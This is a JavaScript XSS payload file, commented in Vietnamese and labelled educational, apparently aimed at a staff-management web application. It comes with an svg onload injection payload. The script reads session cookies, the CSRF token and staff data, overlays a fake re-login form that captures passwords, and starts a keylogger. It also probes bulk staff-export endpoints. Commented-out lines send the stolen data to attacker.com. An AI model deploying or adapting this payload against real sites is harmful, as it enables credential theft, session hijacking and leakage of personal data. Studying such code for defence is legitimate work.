// ============================================================
// evil.js - File JS demo cho XSS test (MỤC ĐÍCH GIÁO DỤC)
// 
// ⚠️ CẢNH BÁO: Chỉ dùng để test bảo mật trên hệ thống bạn được phép.
//    KHÔNG dùng để tấn công hệ thống thật khi chưa có sự cho phép.
//
// Cách dùng:
// 1. Upload file này lên GitHub (raw) hoặc host local
// 2. Dùng payload XSS để tải file này:
//    '><svg onload=document.write(String.fromCharCode(...))>
// 3. Khi nạn nhân mở trang, file này tự động chạy
// ============================================================

(function() {
  'use strict';

  // ============================================================
  // 1. THÔNG TIN HỆ THỐNG
  // ============================================================
  var info = {
    url: window.location.href,
    domain: document.domain,
    title: document.title,
    userAgent: navigator.userAgent,
    time: new Date().toISOString()
  };

  console.log('🔴 XSS LOADED FROM EXTERNAL FILE:', info);

  // ============================================================
  // 2. ĐỌC COOKIE SESSION
  // ============================================================
  var cookies = document.cookie;
  console.log('🔴 COOKIE SESSION:', cookies);

  // ============================================================
  // 3. ĐỌC CSRF TOKEN
  // ============================================================
  var csrfMeta = document.querySelector('meta[name="csrf-token"]');
  var csrfToken = csrfMeta ? csrfMeta.content : 'KHÔNG TÌM THẤY';
  console.log('🔴 CSRF TOKEN:', csrfToken);

  // ============================================================
  // 4. ĐỌC DỮ LIỆU NHÂN SỰ (gon)
  // ============================================================
  var gonData = {};
  try {
    if (typeof gon !== 'undefined') {
      gonData = {
        user_id: gon.user_id,
        organization: gon.organization,
        leader_roles: gon.leader_roles,
        faculty: gon.faculty
      };
      console.log('🔴 GON DATA:', gonData);
    }
  } catch(e) {
    console.log('Không đọc được gon:', e.message);
  }

  // ============================================================
  // 5. HIỆN ALERT THÔNG BÁO (chứng minh XSS chạy)
  // ============================================================
  alert('XSS THÀNH CÔNG!\n\nFile evil.js đã được tải và thực thi.\n\nURL: ' + info.url + '\nCookie: ' + (cookies || 'không có') + '\nCSRF: ' + csrfToken.substring(0, 30) + '...');

  // ============================================================
  // 6. TẠO FORM GIẢ MẠO ĐĂNG NHẬP (PHISHING)
  // ============================================================
  function createPhishingForm() {
    var overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center;';
    
    var form = document.createElement('div');
    form.style.cssText = 'background:#fff;padding:30px;border-radius:8px;width:350px;box-shadow:0 4px 20px rgba(0,0,0,0.3);';
    form.innerHTML = 
      '<h2 style="text-align:center;color:#1976d2;margin-bottom:20px;">Đăng Nhập</h2>' +
      '<p style="text-align:center;color:#666;font-size:13px;margin-bottom:15px;">Phiên đăng nhập hết hạn. Vui lòng xác thực lại.</p>' +
      '<input type="text" id="xss-user" placeholder="Username" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">' +
      '<input type="password" id="xss-pass" placeholder="Password" style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">' +
      '<button id="xss-btn" style="width:100%;padding:10px;background:#1976d2;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:14px;">Xác thực</button>';
    
    overlay.appendChild(form);
    document.body.appendChild(overlay);
    
    document.getElementById('xss-btn').onclick = function() {
      var user = document.getElementById('xss-user').value;
      var pass = document.getElementById('xss-pass').value;
      
      // Mô phỏng gửi dữ liệu về server kẻ tấn công
      console.log('🚨 ĐÃ ĐÁNH CẮP:');
      console.log('  Username:', user);
      console.log('  Password:', pass);
      console.log('  Cookie:', cookies);
      console.log('  CSRF:', csrfToken);
      
      // Trong thực tế, kẻ tấn công sẽ gửi về server:
      // new Image().src = 'https://attacker.com/steal?u=' + encodeURIComponent(user) + '&p=' + encodeURIComponent(pass) + '&c=' + encodeURIComponent(cookies) + '&t=' + encodeURIComponent(csrfToken);
      
      alert('DỮ LIỆU ĐÃ BỊ ĐÁNH CẮP!\n\n(Mô phỏng - xem Console F12)\n\nUsername: ' + user + '\nPassword: ' + pass);
      
      overlay.remove();
    };
  }

  // ============================================================
  // 7. KEYLOGGER (GHI LẠI PHÍM BẤM)
  // ============================================================
  function startKeylogger() {
    var keys = [];
    document.addEventListener('keydown', function(e) {
      keys.push(e.key);
      if (keys.length >= 10) {
        console.log('🚨 KEYLOGGER:', keys.join(''));
        // Trong thực tế: fetch('https://attacker.com/k?k=' + keys.join(''))
        keys = [];
      }
    });
    console.log('🔴 KEYLOGGER ĐÃ BẮT ĐẦU');
  }

  // ============================================================
  // 8. ĐÁNH CẮP DỮ LIỆU QUA API
  // ============================================================
  function stealData() {
    // Đọc CSRF token
    var token = document.querySelector('meta[name="csrf-token"]').content;
    
    // Mô phỏng tải file Excel toàn bộ nhân sự
    // Trong thực tế, kẻ tấn công sẽ:
    // fetch('/user/export_users', {
    //   method: 'POST',
    //   headers: {'X-CSRF-Token': token}
    // }).then(r => r.blob()).then(blob => {
    //   fetch('https://attacker.com/steal', {method: 'POST', body: blob});
    // });
    
    console.log('🔴 CÓ THỂ TẢI DỮ LIỆU QUA API:');
    console.log('  - /user/export_users (Excel 720 nhân sự)');
    console.log('  - /users/index (danh sách nhân sự)');
    console.log('  - /user/details?id=X (hồ sơ chi tiết)');
    console.log('  CSRF token sẵn sàng:', token.substring(0, 30) + '...');
  }

  // ============================================================
  // 9. CHẠY CÁC CHỨC NĂNG
  // ============================================================
  
  // Hiện alert ngay
  // (đã gọi ở phần 5)
  
  // Tạo form phishing sau 2 giây
  setTimeout(createPhishingForm, 2000);
  
  // Bật keylogger
  startKeylogger();
  
  // Hiện thông tin đánh cắp
  stealData();

  // ============================================================
  // TÓM TẮT NHỮNG GÌ FILE NÀY LÀM ĐƯỢC:
  // ============================================================
  // 1. ✅ Đọc cookie session
  // 2. ✅ Đọc CSRF token
  // 3. ✅ Đọc dữ liệu gon (user_id, organization...)
  // 4. ✅ Hiện alert chứng minh XSS
  // 5. ✅ Tạo form giả mạo đăng nhập (phishing)
  // 6. ✅ Keylogger (ghi phím bấm)
  // 7. ✅ Có thể tải dữ liệu qua API (với CSRF token)
  // ============================================================
  
})();
